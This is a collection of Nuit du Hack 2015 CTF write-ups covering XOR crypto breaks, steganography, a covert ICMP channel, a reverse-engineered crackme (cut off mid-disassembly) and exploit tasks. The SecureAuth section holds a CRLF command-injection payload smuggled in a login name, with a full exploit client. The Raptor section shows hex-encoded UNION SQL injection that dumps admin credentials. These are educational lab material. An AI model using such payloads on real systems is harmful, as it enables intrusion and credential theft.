> * Les caractères sont alpha-numériques seulement (`a-zA-Z0-9`).
> * Le `md5sum` du mot de passe valide est: `3efafa3e161a756e6e1711dbceaf9d68`.

___


## Write-up



### File: WU-2015/nuit-du-hack-ctf-quals-2015/README.md

# Nuit du Hack Quals CTF write-ups

* [Website](http://quals.nuitduhack.com/)
* [Scoreboard](http://quals.nuitduhack.com/users)
* [Number of solves per task](solves.txt)

## Completed write-ups

* [crypto/game-of-life](crypto/game-of-life)
* [web/facesec](web/facesec)
* [web/facebox](web/facebox)
* [exploit/updator](exploit/updator)
* [exploit/secureauth](exploit/secureauth)
* [forensic/pdfception](forensic/pdfception)
* [forensic/private](forensic/private)
* [misc/raptor](misc/raptor)
* [reverse/superman](reverse/superman)
* [reverse/mass-surveillance-software](reverse/mass-surveillance-software)
* [reverse/crackme-prime](reverse/crackme-prime)



### File: WU-2015/nuit-du-hack-ctf-quals-2015/crypto/game-of-life/README.md

# Nuit du Hack Quals CTF 2015: Game Of Life

**Category:** Crypto
**Points:** 150
**Solves:** 178
**Description:** 

> "We're born alone, we live alone, we die alone. Only through our love and friendship can we create the illusion for the moment that we're not alone." (Orson Orwell)
> 
> Cells cells cells, the basis of life. Don't let them die and tell us their secret.
> 
> [http://static.challs.nuitduhack.com/GOL.tar.gz](GOL.tar.gz)

___

## Write-up

I wrote this writeup because I have seen some guys doing this challenge by using XORTOOL, but without understanding …

> mister X | python xortool.py cipher.txt; cat xortool_out/000.out
>
> mister X | So hardcore

That’s why I’ll try to give you a real explaination of « why xortool have worked »
So, for this challenge, we were given a .tar.gz.

```{engine='bash'}
$ ls
GOL.tar.gz
$ tar zxvf GOL.tar.gz
liv_GOL/
liv_GOL/consignes
liv_GOL/jdlv.py
liv_GOL/cipher.txt
```


Well, we had a setpoint, a cipher.txt and a python script.

The setpoint learned us this :

```shell
$ cat consignes
[ Game of life ]
[+] The above text has been encoded using the game of life rules on a 8x8 array.
```


Seems legit, the given ciphertext has been encoded with the python script.

Let’s have a quick look on the ciphertext :

```
11000100
00010000
01000111
…
}T]Q_YVTBDUUEECQSUDB:qEDTEB
\_\RBUTETBPW_^:jX^U
```


Okay, a range of 8-grouped bits, one byte per line so.
And after, this encrypted message.

At this point, we looked the program coded in python.
Functions :

```python
def creerGrille():
def genKey(key):
def initGrille(grille,seed):
def tourSuivant(grille):
def genBitstream(grille,key):
def xor(ent1,ent2):
def wrapper():
```

The first function called is the wrapper().

```python
def wrapper():
    key=sys.argv[1]
    fichier=open(sys.argv[2],'rb')
    encfile=''
    bitstream=''
    grille=initGrille(creerGrille(),genKey(key))
    for i in fichier.readlines():
        bitstream=genBitstream(grille,key)
        encfile+=xor(i,bitstream)
        tourSuivant(grille)
    print encfile
```


Well, this function do :
1. initialize the variable « key » with the first argument
- open the file given in the second argument
- create a grid
- for each line, generate a bitstream with the grid and the key
- encrypt the line using XOR and the bitstream
- print the encrypted file

So, the main point is about the XOR encryption.
Firstly, XOR is reversible and it’s not a good encryption even if the key has the same length of the plain. 

> To claryfi : I had some echoes of people do not agree with my statements. To clarify the situation, and angry people who said that I need the review the basic [maybe true], XOR is NOT SECURE except in special circumstances, like OTP + size(key) >= size(plaintext). Without this, XOR is NOT SECURE, particularly when it used in a CTF hahaha (often repeated small key) … But, the discussion is open and I’m not mean, instead of thrashing me on IRC on channel where I’m not present … :p


Secondly, the bitstream is init by the genBistream function, let’s have a look :

```python
def genBitstream(grille, key):
    bitstream = ''
    for j in range(8):
        bitstream += grille[j][7]
    print bitstream
    return bitstream
```


(Lol, the « key » is not used …)

So, the plaintext is XORed by a bitstream, looks like (example) :

```
01010101 ^ line1
00001111 ^ line2
...
nnnnnnnn ^ linen
```


Here, we see that the challenge is fuckedup. Why ?
Because, in the ciphertext, the bistream is given. So, we though to use the bistream to decrypt (not tried). But if you look closer, you can see that the bitstream (generate by the game of life) is spotted very early … The key used by the creator has completly break the challenge ..

The given bitstream was :

```
11000100
00010000
01000111
...
11001100
00000001
10000000
00000000
00000000
00000000
*
00000000
```


That’s to say, at the start, we must have the same key but after, noneed.

Try to explain with an example by printing the bitstream :

```shell
$ cat file
you loseyou loseyou loseyou loseyou loseyou loseyou loseyou loseyou loseyou loseyou loseyou loseyou loseyou loseyou loseyou loseyou loseyou loseyou loseyou loseyou loseyou loseyou loseyou loseyou loseyou loseyou loseyou loseyou loseyou loseyou loseyou loseyou loseyou loseyou
...
you lose
```


```shell
$ python jdlv.py key_fuck_gol__ file
10000110
11000000
...
01000000 <-- END OF GOL
...
00000000
00000000
*
00000000  <-- THE END
```


Ok, the key given in example is good. It stop the GOL early.

```shell
$ python jdlv.py key_fuck_gol__ file > enc
$ python jdlv.py $RANDOM enc
...
you lose
```


HO YEAH. So, by giving a RANDOM key to the program and having a short GOL, we are able to decrypt.

Let’s try with the given ciphertext :

```shell
$ python jdlv.py $RANDOM cipher.txt
...
A bientôt peut-être sur un toit ou dans une autre vie.
 
Flag : ToBeAndToLast
```


PWNED :)


To go further, if RANDOM gave us a bad key which make lonk GOL :

```shell
KEY=$RANDOM ; python jdlv.py $KEY cipher.txt ; echo $KEY
Fmag!: UoBdAndTnLart
12024
```


So, 12024 do not decrypt the ciphertext properly.
For fun, we check his GOL :

```
11011100 <-- START
01010000
11010000
11100000
...
01010000
11010100
00101110 <-- END
```


Indeed, the key generate the GOL which is long enough.

Thanks to this challenge, Notfound makes the firstblood of the quals.

![Alt text](http://i.imgur.com/PimPN0B.png "Output")
![Alt text](https://i2.wp.com/bilder.hifi-forum.de/max/390852/bitch-please-kopie-300x238_175397.jpg "Output")

Enjoy,
[Notfound](http://www.notfound.ovh)



### File: WU-2015/nuit-du-hack-ctf-quals-2015/exploit/secureauth/README.md

# Nuit du Hack Quals CTF 2015: SecureAuth

**Category:** Exploit
**Points:** 350
**Solves:** 16
**Description:** 

> "There is a building. Inside this building there is a level where no elevator can go, and no stair can reach. This level is filled with doors. These doors lead to many places. Hidden places. But one door is special. One door leads to the source." (The Keymaker)
> 
> Find the key. Open the door.
> 
> Static client @ [http://static.challs.nuitduhack.com/SecureAuthClient.tar.gz](SecureAuthClient.tar.gz)
> 
> <secureauth.challs.nuitduhack.com:4241>

## Write-up

This task is an exploit task worth 350 points from the Nuit du Hack qualifications.
We are given the following Python code :

```python    
import socket
from hashlib import sha256
 
class SecureConnect_Client():
    def __init__(self):
        self.sock = None
        self.username = None
        self.password = None
 
    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect(("151.80.18.93", 4241))
 
    def login(self, username, password):
        self.username = username
        self.password = password
        challenge = self.get_challenge()
        authpacket = self.process_authpacket(username, password, challenge)
        print "[~] Sending auth packet..."
        self.sock.sendall(authpacket)
 
    def get_challenge(self):
        data = self.sock.recv(1024)
        if data[:9] == "CHALLENGE":
            print "[~] Server sent challenge : %s !" % data[10:-1]
            return data[10:-1]
        raise Exception("Bad challenge...")
 
    def process_authpacket(self, username, authtoken, challenge):
        packet = "AUTH %s|%s" % (username, sha256(sha256(authtoken).hexdigest() + challenge).hexdigest())
        print "[+] Auth data : %s" % packet
        return packet
 
    def get_response(self):
        print self.sock.recv(1024)
        print self.sock.recv(1024)
 
    def close(self):
        self.sock.close()
 
if __name__ == "__main__":
    scc = SecureConnect_Client()
    scc.connect()
    scc.login("username", "password")
    scc.get_response()
    scc.close()
```

This scripts connects to a server (151.80.18.93, port 4241).
The servers sends us a challenge. It will be used as a salt to hash our password.
We then try to login with the following command :
    
```
AUTH $login|sha256(sha256($pass) || $challenge)
(Where || is a concatenation.)
```

The algorithm seems to be pretty secure. But there has to be a way to break it.
Overflow didn’t work.
Format string didn’t work.
We then tried to inject special chars, such as quotes, new lines… and figured that new lines produced an unexpected behaviour.

By putting a new line, we got the following error :
    
> [+] Welcome -ERR unknown command ':name' we are verifying your password...

We tried to guess commands, and connect with « \r\nGET\r\n ».
    
> [+] Welcome -ERR wrong number of arguments for 'get' command we are verifying your password...

Spaces are not allowed. New lines makes a new command. So we need a whitespace char : \t.

Loging in with \r\nGET\tyolo\r\n :
    
> [+] Welcome $-1 we are verifying your password...

We managed to get the original behaviour by using « admin:name\r\nGET\t » as a login.
It makes the following commands :
```
GET admin:name
GET :name
```

> [+] Welcome Administrator we are verifying your password...

Our thoughts are that it was probably a database. So we tried to guess an other field, like… a password, maybe ?
admin:password\r\nGET\t
    
> [+] Welcome 837a135ad3ccb1978f169aa62a62a028b76ec42b2284791bd4703421ec050529 we are verifying your password...

Hum hum. :)
Since the hash we send is sha256($hash || $challenge), we need to edit the script to send our hash, and login as admin.
Final code :

```python
import socket
from hashlib import sha256
 
class SecureConnect_Client():
    def __init__(self):
        self.sock = None
        self.username = None
        self.password = None
 
    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect(("151.80.18.93", 4241))
 
    def login(self, username, password):
        self.username = username
        self.password = password
        challenge = self.get_challenge()
        authpacket = self.process_authpacket(username, password, challenge)
        print("[~] Sending auth packet...")
        self.sock.sendall(authpacket.encode())
 
    def get_challenge(self):
        data = self.sock.recv(1024)
        if data[:9] == b"CHALLENGE":
            print("[~] Server sent challenge : {} !".format(data[10:-1]))
            return data[10:-1]
        raise Exception("Bad challenge...")
 
    def process_authpacket(self, username, authtoken, challenge):
        packet = "AUTH {}|{}".format(username, authtoken)#sha256(sha256(authtoken.encode()).hexdigest() + challenge).hexdigest())
        packet = "AUTH {}|{}".format(username, sha256(authtoken.encode() + challenge).hexdigest())
        print("[+] Auth data : {}".format(packet))
        return packet
 
    def get_response(self):
        print(self.sock.recv(1024).decode())
        print(self.sock.recv(1024).decode())
 
    def close(self):
        self.sock.close()
 
if __name__ == "__main__":
    scc = SecureConnect_Client()
    scc.connect()
    # scc.login("user'name", "password")
    scc.login("admin:password\r\nGET\t", "837a135ad3ccb1978f169aa62a62a028b76ec42b2284791bd4703421ec050529")
    scc.get_response()
    scc.close()
```

Result :
> [+] Congrats. The flag is : *INSERT_FUNNY_QUOTE_HERE*

Flag: *INSERT_FUNNY_QUOTE_HERE*

Thanks to: 
[Tishrom](https://twitter.com/Tishrom)

— [XeR](https://twitter.com/XeR_0x2A)



### File: WU-2015/nuit-du-hack-ctf-quals-2015/exploit/updator/README.md

# Nuit du Hack Quals CTF 2015: Updator

**Category:** Exploit
**Points:** 200
**Solves:** 40
**Description:** 

> Unhackable : "Not hackable; that cannot be hacked or broken into."
> 
> We manage updates and thus have fixes, this is not a PS3 as it is unhackable ... or is it?
> 
> <http://updator.challs.nuitduhack.com/>

___

## Write-up

This task is an exploit task worth 200 points from the [Nuit du Hack qualifications](http://quals.nuitduhack.com/).<br>
We are given a website with a login form, and a link to an other page : update.py.<br>
Thxer’s first idea was to look for pyc files.<br>
We then decompiled update.pyc with [uncompyle](https://github.com/gstarnberger/uncompyle):


```python
# 2015.04.04 01:50:48 CEST
import config
import sys
KEY = config.KEY
 
def xor(*args):
    if len(args) < 2:
        sys.exit(0)
    length = len(args[0])
    for arg in args:
        if len(arg) != length:
            sys.exit(0)
        length = len(arg)
 
    cipher = args[0]
    for arg in args[1:]:
        cipher = ''.join([ chr(ord(arg[i]) ^ ord(cipher[i])) for i in range(len(arg)) ])
 
    return cipher
 
 
class Crypto:
 
    @staticmethod
    def encrypt(file):
        with open(file, 'r') as fd:
            content = fd.read()
        content = content.ljust(len(content) + (8 - len(content) % 8), '0')
        blocks = [ content[(i * 8):((i + 1) * 8)] for i in range(len(content) / 8) ]
        with open('%s.encrypted' % file, 'w') as fd:
            encrypted = []
            for i in range(len(blocks)):
                if i == 0:
                    encrypted.append(xor(KEY, blocks[i]))
                else:
                    encrypted.append(xor(KEY, blocks[i], encrypted[(i - 1)]))
 
            fd.write(''.join(encrypted))
 
 
 
    @staticmethod
    def decrypt(file):
        with open(file, 'r') as fd:
            content = fd.read()
        blocks = [ content[(i * 8):((i + 1) * 8)] for i in range(len(content) / 8) ]
        with open('.'.join(file.split('.')[:-1]), 'w') as fd:
            plain = []
            for i in range(len(blocks)):
                if i == 0:
                    plain.append(xor(KEY, blocks[i]))
                else:
                    plain.append(xor(KEY, blocks[i], blocks[(i - 1)]))
 
            fd.write(''.join(plain).rstrip('0'))
 
 
 
print 'Content-Type: text/html'
print '\n<!DOCTYPE html>\n<html>\n  <head>\n    <meta charset="UTF-8">\n    <title>Updator - Update system</title>\n    <link rel="stylesheet" href="static/font-awesome/css/font-awesome.css">\n    <link rel="stylesheet" href="static/css/style.css">\n  </head>\n  <body>\n    <div id="info">\n      The update managing system is still under construction but will be available soon.\n    </div>\n  </body>\n</html>\n'
```


You know what is fun in challenges ? Guessing for directories.

By guessing the /temp directory, you can find a file, log.py.encrypted.<br>
Since we know the encryption routine, we made a quick script to make a known-plaintext attack.<br>

```php
<?php
$file = 'log.py.encrypted';
$bin  = file_get_contents($file);
 
function xorStr($a, $b)
{
    $c = '';
     
    $na = strlen($a);
    $nb = strlen($b);
     
    for($i = 0; $i < max($na, $nb); $i++)
        $c .= chr(ord($a[$i % $na]) ^ ord($b[$i % $nb]));
     
    return $c;
}
 
// Finding the key :
$b       = strlen($bin) / 8;
$block   = array();
$block[] = substr($bin, 0, 8);
 
for($i = 1; $i < $b; $i++)
    $block[$i] = xorStr($block[$i - 1], substr($bin, $i * 8, 8));
 
$bin2  = implode('', $block);
$known = "import ";
$key   = substr(xorStr($bin2, $known), 0, strlen($known));
 
 
for($i = 0; $i < 8; $i++) {
    printf("Key     : %s\n", $key);
    printf("Padding : %d\n", $i);
    printf("Code\n%s\n", xorStr($bin2, $key . str_repeat("\0", $i)));
    printf("------------------------\n");
}
 
// At this point, we realize that the code starts with import datetime.
// We then managed to retrieve the key since there is a repetition with
// $known = "import datetime".
 
$key   = '6[@dq"&s';
$plain = xorStr($key, substr($bin, 0, 8));
 
for($i = 1; $i < $b; $i++)
    $plain .= xorStr(xorStr($key, substr($bin, $i * 8, 8)), substr($bin, ($i - 1) * 8, 8));
 
var_dump($plain);
```


Decrypted code is :

```python
import datetime
 
LOG_DIR = 'logs'
 
class Logger():
 
    @staticmethod
    def log(username, password):
        basename = '%s/%s_%s' % (LOG_DIR, str(datetime.date.today()), username)
        with open(basename, 'a+') as fd:
            fd.write('[%s] Login with password %s\n' % (str(datetime.datetime.today()), password))
```

By reading file /logs/2015-04-04_admin, we see the following connection attempts :

```
[2015-04-04 18:49:48.839448] Login with password Mpt2P4sse2Ouf
[2015-04-04 18:49:54.044382] Login with password Mot2P4sse2Ouf
```

If you log in with admin:Mot2P4sse2Ouf, you get the following message :
Well played, here is your flag : zEpbiUFt5p7m84cxOxN6

Flag: zEpbiUFt5p7m84cxOxN6.

Thanks to
[Thxer](https://twitter.com/Thxer_),

— [XeR](https://twitter.com/XeR_0x2A)



### File: WU-2015/nuit-du-hack-ctf-quals-2015/forensic/pdfception/README.md

# Nuit du Hack Quals CTF 2015: PDFCeption

**Category:** Forensics
**Points:** 500
**Solves:** 7
**Description:** 

> "What is the most resilient parasite? Bacteria? A virus? An intestinal worm? An idea. Resilient... highly contagious. Once an idea has taken hold of the brain it's almost impossible to eradicate. An idea that is fully formed - fully understood - that sticks; right in there somewhere. " (Cobb)
> 
> Where is that idea located? Can you tell us what it is?
> 
> <http://static.challs.nuitduhack.com/PDFCeption.tar.gz>

___

## Write-up

Well, we don’t validate this challenge at time, but few secondes after the end …

We just explain a quick way to do because this shitty challenge does not deserve a nice writeup.<br>
We were given a .vdi and a file called `lastdump`.<br>
This file was supposed to be encrypted (LUKS) but it was not the case …

So we have extracted the data :

```bash
$ foremost -t pdf lastdump
# or
$ photorec <on the lastdump>
```
<br><br>

It was like … 3AM and we already got the PDF with the logo.<br>
We spend many many MANY times on it, searching for a PDF in the PDF (PDFCeption …), playing with ascii85decode to decode stream, etc.

At 10AM, Notfound asked to the author, an embittered person (yggdrasil):

> 2015-04-04 10:02:19 Notfound_ is the logo important ?

No reponse …
A shitty hint was given :

> PDFCeption -> Hint: find the difference http://bit.ly/1avCLaQ

Just before midnight, we decided to try LSB on the logo (for a MISC500, yeah LSB, seems legit).<br>
Indeed, the surprise was huge. The logo is stegano !!!!

![Alt text](https://hexpresso.files.wordpress.com/2015/04/lel.png)
_lel_

Last step, find what kind : LSB BGR.

__The flag is__: DaddyDontTouchMeThere

— [Notfound](http://www.notfound.ovh)



### File: WU-2015/nuit-du-hack-ctf-quals-2015/forensic/private/README.md

# Nuit du Hack Quals CTF 2015: Private

**Category:** Forensics
**Points:** 100
**Solves:** 114
**Description:** 

> "The quiet you are, the more you are able to ear"
> 
> [http://static.challs.nuitduhack.com/Private.tar.gz](Private.tar.gz)

___

## Write-up

Private 100 was a nice but really easy challenge. Many people found it difficult but it was not.

The first thing to do was to read the network capture to see the content.
We see many things, like STP, ICMP, ARP, CDP…

```bash
$ tshark -r PrivateChannel.pcap.pcapng
1 0.000000000 c2:01:12:a2:f1:02 -> Spanning-tree-(for-bridges)_00 STP Conf. Root = 32768/0/c2:01:12:a2:00:01 Cost = 0 Port = 0x802b
...
 
479 796.186499000 192.168.50.10 -> 192.168.0.50 ICMP Echo (ping) request
480 796.205229000 192.168.0.50 -> 192.168.50.10 ICMP Echo (ping) reply
```
<br><br>
Well, our first though was to check ICMP data : nothing.<br>
After that, we saw that in ICMP pacquet, the ID of IP Layer had values between ASCII code (32-126).

So we have coded a small one liner to check that :

```bash
$ echo -e $(tshark -r PrivateChannel.pcap.pcapng -e ip.id -Tfields  | sed -re 's/0x//;s/(..)/\\x\1/g') | egrep -a -o "[a-z0-9A-Z]+" | tr '\n' ' '
d d e e 0 0 1 1 1 1 l l m m R i h 4 e O r T e a r i s y o u r f l a g 6 J S R 3 c r r 3 t 4 g 3 n t
```
<br><br>

Ho yeah, very interesting !<br>
We can see « is your flag », but the end is quiet fuckedup.<br>
Nvm, we took a pokeball and we called PYTHON !<br>
Be carefull, scapy is capricious and will not accept the pcapng.<br>

To bypass that shit, you can use tcpdump :
```bash
$ tcpdump -r PrivateChannel.pcap.pcapng -w cap.pcap
```
<br><br>

Now, we are ready :)

```python
from scapy.all import *
 
# pk = rdpcap('PrivateChannel.pcap.pcapng')
pk = rdpcap('cap.pcap')
 
buff = ""
for i in range(480, 550):
    try:
         buff += chr(pk[i][1].id)
    except:
        print("YOU JUST LOSE THE GAME NOOB")
 
print("Ok you win ! -> %s" % buff)
```
<br><br>

Execute it :

```bash
$ python icmp.py
YOU JUST LOSE THE GAME NOOB
...
YOU JUST LOSE THE GAME NOOB
Ok you win ! -> here is your flag : S3cr3t4g3nt
```
<br><br>
Pwned,
__Flag__: S3cr3t4g3nt

Enjoy.
<br>
— [Notfound](http://www.notfound.ovh)



### File: WU-2015/nuit-du-hack-ctf-quals-2015/misc/raptor/README.md

# Nuit du Hack Quals CTF 2015: Raptor

**Category:** Misc
**Points:** 400
**Solves:** 19
**Description:** 

> <raptor.challs.nuitduhack.com:4142>

___

## Write-up

Let’s connect to the service :
<br>
```
$ nc raptor.challs.nuitduhack.com 4142
nc: using stream socket
~ » Welcome to the Raptor/1.0 Information Exchange Server
 
~ » You are anonymous - Read only access !
 
Available commands :
+----------+-----------------+-------------------------------+--------------------------------+
| Command | Required Access | Syntax | Help |
+----------+-----------------+-------------------------------+--------------------------------+
| AUTH | guest | AUTH [login] [password] | Connect to an account |
| LIST | user | LIST [maxrecords] | List users informations |
| SEARCH | user | SEARCH [pattern] [maxresults] | Search an user |
| RSHELL | admin | RSHELL | Migrate to Raptor Shell |
| VERSION | guest | VERSION | Show current Raptor version |
| REGISTER | guest | REGISTER | Register a new account |
| HELP | guest | VERSION | Show this help menu |
| RIGHTS | guest | RIGHTS | Print your current rights |
| HISTORY | user | HISTORY | Show your call history |
| RESET | guest | RESET | ROLLBACK ! (Reset the CTF DB.) |
| QUIT | guest | QUIT | Close the connection. |
+----------+-----------------+-------------------------------+--------------------------------+
 
guest ~ $
```
<br>

- After some tests, Notfound found (*tadam tss*) that the phone field can be used to inject hexa code when you register a new user :

```
Login : po
Firstname : po
Lastname : po
Contact (DESK PHONE) : 0x4141
Password : po
Encrypting using 128x(ROT13) ......HAAAAAAAAX......
Password encryption done ! (Security First) !
guest ~ $ AUTH po po
Welcome po !
po ~ $ LIST
 
+-----------------------+-----------------------+-----------+--------+
|       FIRSTNAME       |        LASTNAME       | DESKPHONE | RIGHTS |
+-----------------------+-----------------------+-----------+--------+
|          Yvan         |        Delacam        |    0452   |  user  |
|           ok          |           ok          |    213    |  user  |
|         Wesley        |       Eshmaggle       |    4412   | admin  |
|         Wesley        |       Eshmaggle       |    4412   |  user  |
| ().__class__.__base__ | ().__class__.__base__ |     5     |  user  |
|         Zlatan        |     Ibrahimovitch     |    5122   |  user  |
|          Yvon         |         Payrir        |     A     |  user  |
|           lm          |           lm          |     A     |  user  |
|           po          |           po          |     AA    |  user  |
+-----------------------+-----------------------+-----------+--------+
```
<br>
- After that, when you log as the « po » user and type the « HISTORY » command, the injection happened. So (after many tests…) let’s try to get all the tables !

Using python :

`python 
>>> "1 UNION select table_schema,table_name,null,null FROM information_Schema.tables".encode('hex')
'3120554e494f4e2073656c656374207461626c655f736368656d612c7461626c655f6e616d652c6e756c6c2c6e75'
`
<br>
```
Login : i
Firstname : i
Lastname : i
Contact (DESK PHONE) : 0x3120554e494f4e2073656c656374207461626c655f736368656d612c7461626c655f6e616d652c6e756c6c2c6e756c6c2046524f4d20696e666f726d6174696f6e5f536368656d612e7461626c6573
Password : i
Encrypting using 128x(ROT13) ......HAAAAAAAAX......
Password encryption done ! (Security First) !
guest ~ $ AUTH i i
Welcome i !
i ~ $ HISTORY
 
RAPTOR CALL REPORTING
 
- CLIENT INFO :
 
+-----------+---------------------------------------------------------------------------------+
|  USERNAME |                                        i                                        |
|   RIGHTS  |                                       user                                      |
| DESKPHONE | 1 UNION select table_schema,table_name,null,null FROM information_Schema.tables |
+-----------+---------------------------------------------------------------------------------+
 
 - CALL HISTORY
 
+--------------------+---------------------------------------+-------------+----------+
|         ID         |                  DATE                 | DESTINATION | DURATION |
+--------------------+---------------------------------------+-------------+----------+
| information_schema |             CHARACTER_SETS            |     None    |   None   |
| information_schema |               COLLATIONS              |     None    |   None   |
| information_schema | COLLATION_CHARACTER_SET_APPLICABILITY |     None    |   None   |
| information_schema |                COLUMNS                |     None    |   None   |
| information_schema |           COLUMN_PRIVILEGES           |     None    |   None   |
| information_schema |                ENGINES                |     None    |   None   |
| information_schema |                 EVENTS                |     None    |   None   |
| information_schema |                 FILES                 |     None    |   None   |
| information_schema |             GLOBAL_STATUS             |     None    |   None   |
| information_schema |            GLOBAL_VARIABLES           |     None    |   None   |
| information_schema |            KEY_COLUMN_USAGE           |     None    |   None   |
| information_schema |               PARAMETERS              |     None    |   None   |
| information_schema |               PARTITIONS              |     None    |   None   |
| information_schema |                PLUGINS                |     None    |   None   |
| information_schema |              PROCESSLIST              |     None    |   None   |
| information_schema |               PROFILING               |     None    |   None   |
| information_schema |        REFERENTIAL_CONSTRAINTS        |     None    |   None   |
| information_schema |                ROUTINES               |     None    |   None   |
| information_schema |                SCHEMATA               |     None    |   None   |
| information_schema |           SCHEMA_PRIVILEGES           |     None    |   None   |
| information_schema |             SESSION_STATUS            |     None    |   None   |
| information_schema |           SESSION_VARIABLES           |     None    |   None   |
| information_schema |               STATISTICS              |     None    |   None   |
| information_schema |                 TABLES                |     None    |   None   |
| information_schema |              TABLESPACES              |     None    |   None   |
| information_schema |           TABLE_CONSTRAINTS           |     None    |   None   |
| information_schema |            TABLE_PRIVILEGES           |     None    |   None   |
| information_schema |                TRIGGERS               |     None    |   None   |
| information_schema |            USER_PRIVILEGES            |     None    |   None   |
| information_schema |                 VIEWS                 |     None    |   None   |
| information_schema |           INNODB_BUFFER_PAGE          |     None    |   None   |
| information_schema |               INNODB_TRX              |     None    |   None   |
| information_schema |        INNODB_BUFFER_POOL_STATS       |     None    |   None   |
| information_schema |           INNODB_LOCK_WAITS           |     None    |   None   |
| information_schema |             INNODB_CMPMEM             |     None    |   None   |
| information_schema |               INNODB_CMP              |     None    |   None   |
| information_schema |              INNODB_LOCKS             |     None    |   None   |
| information_schema |          INNODB_CMPMEM_RESET          |     None    |   None   |
| information_schema |            INNODB_CMP_RESET           |     None    |   None   |
| information_schema |         INNODB_BUFFER_PAGE_LRU        |     None    |   None   |
|    x_7822021020    |               call_logs               |     None    |   None   |
|    x_7822021020    |                 users                 |     None    |   None   |
+--------------------+---------------------------------------+-------------+----------+
```
<br>

Time to get what we need : <br>login and password of the « admin » user, to run the RSHELL.

```
Login : n
Firstname : n
Lastname : n
Contact (DESK PHONE) : 0x3120554e494f4e2053454c454354206c6f67696e2c70617373776f72642c7269676874732c66697273746e616d652046524f4d207573657273
Password : n
Encrypting using 128x(ROT13) ......HAAAAAAAAX......
Password encryption done ! (Security First) !
guest ~ $ AUTH n n
Welcome n !
n ~ $ HISTORY

RAPTOR CALL REPORTING
 
- CLIENT INFO :

+-----------+-----------------------------------------------------------+
|  USERNAME |                             n                             |
|   RIGHTS  |                            user                           |
| DESKPHONE | 1 UNION SELECT login,password,rights,firstname FROM users |
+-----------+-----------------------------------------------------------+

- CALL HISTORY

+-----------------+-------------------------------------+-------------+----------+
|        ID       |                 DATE                | DESTINATION | DURATION |
+-----------------+-------------------------------------+-------------+----------+
| z.ibrahimovitch |          WhaledoneWhalecome         |     user    |  Zlatan  |
|    y.delacam    |         BrainBrainBrainBrain        |     user    |   Yvan   |
|     y.payrir    | bordel.quand.on.rentre.sur.la.piste |     user    |   Yvon   |
|   w.eshmaggle   |              Hanlbatard             |    admin    |  Wesley  |
|        l        |                  l                  |     user    |    l     |
|        m        |                  m                  |     user    |    m     |
|        n        |                  n                  |     user    |    n     |
+-----------------+-------------------------------------+-------------+----------+
```
<br><br>

- And now, we can use the admin login/password to log and run the RSHELL command :

```bash
guest ~ $ AUTH w.eshmaggle Hanlbatard
Welcome w.eshmaggle !

w.eshmaggle ~ $ RSHELL
Ok, ok good job. You are admin... The flag is : 0eb80d9c2cdee95b461cf0b70d40791f

w.eshmaggle ~ $
```
<br>

Done, and thx [Thxer](https://twitter.com/Thxer_) and RageYL

— [Elkaluche](https://twitter.com/Elkaluche)



### File: WU-2015/nuit-du-hack-ctf-quals-2015/reverse/crackme-prime/README.md

# Nuit du Hack Quals CTF 2015: Crackme Prime

**Category:** Crackme/Reverse
**Points:** 150
**Solves:** 90
**Description:** 

> "I am Optimus Prime, and I send this message to any surviving Autobots taking refuge among the stars. We are here, we are waiting."
> 
> Keygen me, I'm the Prime.
> 
> Validate your serial here : <http://crackmeprime.challs.nuitduhack.com/>
> 
> [http://static.challs.nuitduhack.com/prime.tar.gz](prime.tar.gz)

___

## Write-up

This task is a Crackme/Reverse task worth 150 points from the Nuit du Hack qualifications.
We are given an ELF :

```
crackme: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=0x92d632c664b683dc98873fe1c785d1e6928e7272, not stripped
```

This task was not particularly hard, but we solved it in an interesting way.<br>
As usual, we start by opening the crackme in IDA.<br>
We quickly notice that it expects a serial number in argv.<br>
There is a strlen instruction right after :

```asm
.text:08048E2A                 push    eax
.text:08048E2B                 call    strlen
.text:08048E30                 add     esp, 10h
.text:08048E33                 cmp     eax, 29
.text:08048E36                 jnz     badboy_format
```


If the serial’s length is not 29, we jump to an error.

```asm
.text:08048E47                 push    '0'             ; c
.text:08048E49                 push    eax             ; s
.text:08048E4A                 call    _strchr
.text:08048E4F                 add     esp, 10h
.text:08048E52                 test    eax, eax
.text:08048E54                 jz      short goodboy_noZeroes
```

We can see that it expects the serial to have no zeroes in it.

There is a huge block with memsets, strncpy, strtol, and « c1″ (a custom function).<br>
By looking at the strncpy, we realize that the format is supposed to be formated this way :

`([0-9a-fA-F]{4}.){5}[0-9a-fA-F]{4}`

(Understand : 6 blocs of hex shorts, separated by any char, because strtol’s 3rd parameter is base 16.)

The c1 function is a custom function that uses AES.<br>
It seems to decrypt a routine, and jump to it, since there is a call eax after the AES calls.<br>
By setting a breakpoint on the call eax, we can see what the function was :

```asm
[heap]:093664B0 ; =============== S U B R O U T I N E =======================================
[heap]:093664B0
[heap]:093664B0 ; Attributes: bp-based frame
[heap]:093664B0
[heap]:093664B0 isPrime proc near
[heap]:093664B0
[heap]:093664B0 divisors= dword ptr -8
[heap]:093664B0 i= dword ptr -4
[heap]:093664B0 n= dword ptr  8
[heap]:093664B0
[heap]:093664B0 push    ebp
[heap]:093664B1 mov     ebp, esp
[heap]:093664B3 sub     esp, 10h
[heap]:093664B6 mov     [ebp+divisors], 0
[heap]:093664BD mov     [ebp+i], 1
[heap]:093664C4 jmp     short loc_93664E3
[heap]:093664C6 ; ---------------------------------------------------------------------------
[heap]:093664C6
[heap]:093664C6 loc_93664C6:                            ; CODE XREF: isPrime+39j
[heap]:093664C6 mov     eax, [ebp+n]
[heap]:093664C9 cdq
[heap]:093664CA idiv    [ebp+i]
[heap]:093664CD mov     eax, edx
[heap]:093664CF test    eax, eax
[heap]:093664D1 jnz     short loc_93664DF
[heap]:093664D3 add     [ebp+divisors], 1
[heap]:093664D7 cmp     [ebp+divisors], 2
[heap]:093664DB jle     short loc_93664DF
[heap]:093664DD jmp     short loc_93664EB
[heap]:093664DF ; ---------------------------------------------------------------------------
[heap]:093664DF
[heap]:093664DF loc_93664DF:                            ; CODE XREF: isPrime+21j
[heap]:093664DF                                         ; isPrime+2Bj
[heap]:093664DF add     [ebp+i], 1
[heap]:093664E3
[heap]:093664E3 loc_93664E3:                            ; CODE XREF: isPrime+14j
[heap]:093664E3 mov     eax, [ebp+i]
[heap]:093664E6 cmp     eax, [ebp+n]
